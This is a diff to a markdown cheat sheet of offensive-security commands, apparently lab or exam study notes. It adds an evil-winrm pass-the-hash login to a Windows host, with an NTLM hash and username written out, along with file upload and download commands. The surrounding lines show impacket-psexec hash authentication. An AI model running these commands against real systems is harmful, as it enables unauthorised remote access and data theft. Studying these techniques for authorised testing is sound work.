@@ -473,6 +473,14 @@ Best:
 impacket-psexec -hashes 00000000000000000000000000000000:e460605a9dbd55097c6cf77af2f89a03 jeffadmin@192.168.248.72
 ```
 
+## Evil-WinRM
+```
+evil-winrm -i 10.10.113.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+```
+Also,
+- `upload <filename>`
+- `download <filename>`
+
 ## Pass the Hash
 - this will not work for Kerberos authentication but only for servers or services using NTLM authentication.
 - https://github.com/byt3bl33d3r/pth-toolkit
